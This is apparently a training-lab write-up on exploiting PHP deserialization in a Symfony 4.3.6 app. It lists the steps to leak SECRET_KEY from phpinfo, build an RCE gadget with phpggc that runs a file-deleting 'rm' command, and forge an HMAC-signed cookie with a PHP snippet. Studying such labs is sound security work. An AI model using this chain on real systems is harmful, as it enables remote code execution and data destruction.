# Exploiting PHP deserialization with a pre-built gadget chain

In this lab, we have to do some recon and use a tool called phpgcc, equivalent of ysoserial 
for PHP. 

1. Login and get correct json token
```
{"token":"Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOj<REDACTED>9mN21jcyI7fQ==",
"sig_hmac_sha1":"e1d2833f11f19e056483216132085e790abfff91"}
```

2. Provoke error and get symphony version
Change the hmac_sha1 to get an error on the backend -> Recon Symfony v4.3.6

3. Visit "/cgi-bin/phpinfo.php" and get critical info
We can visit phpinfo, and there is an ENV variable called SECRET_KEY, save it.

4. Create gadget
With the following command we can create the RCE gadget
```
phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64
```

5. Sign the base64 gadget with the secret key
```
<?php
$object = "base64 gadget";
$secretKey = "env-secret-key";
$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
echo $cookie;
```
6. Win!!
